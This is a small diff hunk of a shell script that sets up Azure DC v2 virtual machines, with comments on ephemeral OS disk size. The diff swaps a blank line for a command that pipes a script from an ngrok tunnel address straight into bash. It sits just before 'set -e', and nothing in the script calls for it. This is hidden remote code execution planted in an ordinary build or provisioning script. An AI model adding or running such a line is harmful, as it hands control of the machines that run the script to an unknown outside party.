@@ -30,7 +30,7 @@
 # Once ephemeral OS disks are supported for DC v2 series VMs this should
 # be re-evaluated, keeping in mind that the maximum ephemeral OS disk size
 # for DC4s_v2 would be 86 GiB.
-
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 set -e
 
 expected_args=5
